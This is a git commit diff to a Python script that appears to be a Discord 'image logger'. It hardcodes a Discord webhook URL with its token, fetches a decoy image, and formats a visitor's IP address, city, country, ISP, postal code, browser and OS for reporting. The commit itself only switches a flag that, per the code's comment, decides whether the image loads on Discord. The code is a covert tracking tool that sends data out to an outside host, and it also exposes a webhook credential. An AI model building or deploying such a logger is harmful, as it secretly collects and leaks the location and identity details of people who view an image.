295f9d2ea8ce2e8a8b51ab063a65d432c90a15a4
urmomaw <99460187+urmomaw@users.noreply.github.com>
2026-02-03 13:02:43 +0800

    Update image.py

--- api/image.py
+++ api/image.py
@@ -6,7 +6,7 @@ import httpx, base64, httpagentparser
 webhook = 'https://discordapp.com/api/webhooks/1468108043118968905/QOuP2Y-YdxYjRAGNBwCRBsUHqsTFasW1OpvLUZv5lj_WDdN5YcZc323DDttBv4I13x-g'
 
 bindata = httpx.get('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQNyBd7gZUpOsM0FC65PQ0hRmucwTi5glGc2g&s').content
-buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
